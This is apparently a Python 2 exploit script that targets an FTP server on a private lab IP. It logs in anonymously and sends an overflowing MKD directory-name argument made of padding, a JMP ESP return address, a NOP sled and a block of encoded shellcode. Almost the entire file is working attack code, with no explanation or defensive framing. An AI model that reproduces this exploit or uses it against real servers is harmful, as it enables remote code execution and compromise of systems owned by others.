import socket
import struct

HOST = "192.168.92.129"
PORT = 21
BUFFER = 1024

username = "anonymous"
password = "anonymous"

buf =  ""
buf += "\xdd\xc0\xd9\x74\x24\xf4\x58\xbb\x69\xbc\x98\xd4\x31"
buf += "\xc9\xb1\x52\x83\xe8\xfc\x31\x58\x13\x03\x31\xaf\x7a"
buf += "\x21\x3d\x27\xf8\xca\xbd\xb8\x9d\x43\x58\x89\x9d\x30"
buf += "\x29\xba\x2d\x32\x7f\x37\xc5\x16\x6b\xcc\xab\xbe\x9c"
buf += "\x65\x01\x99\x93\x76\x3a\xd9\xb2\xf4\x41\x0e\x14\xc4"
buf += "\x89\x43\x55\x01\xf7\xae\x07\xda\x73\x1c\xb7\x6f\xc9"
buf += "\x9d\x3c\x23\xdf\xa5\xa1\xf4\xde\x84\x74\x8e\xb8\x06"
buf += "\x77\x43\xb1\x0e\x6f\x80\xfc\xd9\x04\x72\x8a\xdb\xcc"
buf += "\x4a\x73\x77\x31\x63\x86\x89\x76\x44\x79\xfc\x8e\xb6"
buf += "\x04\x07\x55\xc4\xd2\x82\x4d\x6e\x90\x35\xa9\x8e\x75"
buf += "\xa3\x3a\x9c\x32\xa7\x64\x81\xc5\x64\x1f\xbd\x4e\x8b"
buf += "\xcf\x37\x14\xa8\xcb\x1c\xce\xd1\x4a\xf9\xa1\xee\x8c"
buf += "\xa2\x1e\x4b\xc7\x4f\x4a\xe6\x8a\x07\xbf\xcb\x34\xd8"
buf += "\xd7\x5c\x47\xea\x78\xf7\xcf\x46\xf0\xd1\x08\xa8\x2b"
buf += "\xa5\x86\x57\xd4\xd6\x8f\x93\x80\x86\xa7\x32\xa9\x4c"
buf += "\x37\xba\x7c\xc2\x67\x14\x2f\xa3\xd7\xd4\x9f\x4b\x3d"
buf += "\xdb\xc0\x6c\x3e\x31\x69\x06\xc5\xd2\x56\x7f\x99\xa2"
buf += "\x3f\x82\x21\xb2\xe3\x0b\xc7\xde\x0b\x5a\x50\x77\xb5"
buf += "\xc7\x2a\xe6\x3a\xd2\x57\x28\xb0\xd1\xa8\xe7\x31\x9f"
buf += "\xba\x90\xb1\xea\xe0\x37\xcd\xc0\x8c\xd4\x5c\x8f\x4c"
buf += "\x92\x7c\x18\x1b\xf3\xb3\x51\xc9\xe9\xea\xcb\xef\xf3"
buf += "\x6b\x33\xab\x2f\x48\xba\x32\xbd\xf4\x98\x24\x7b\xf4"
buf += "\xa4\x10\xd3\xa3\x72\xce\x95\x1d\x35\xb8\x4f\xf1\x9f"
buf += "\x2c\x09\x39\x20\x2a\x16\x14\xd6\xd2\xa7\xc1\xaf\xed"
buf += "\x08\x86\x27\x96\x74\x36\xc7\x4d\x3d\x46\x82\xcf\x14"
buf += "\xcf\x4b\x9a\x24\x92\x6b\x71\x6a\xab\xef\x73\x13\x48"
buf += "\xef\xf6\x16\x14\xb7\xeb\x6a\x05\x52\x0b\xd8\x26\x77"

garbage = "A" * 246
shellcode = buf
JMP_ESP = struct.pack("<I", 0x7CB48EED)
EIP = JMP_ESP
NOP = "\x90" * 100

payload = garbage + EIP + NOP + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.recv(BUFFER)
s.send('USER %s\r\n' % (username))
s.recv(BUFFER)
s.send('PASS %s\r\n' % (password))
s.recv(BUFFER)
print "LEN PAYLOAD: %s" % len(payload)
s.send('MKD  %s\r\n' % (payload))
s.recv(BUFFER)
s.close()
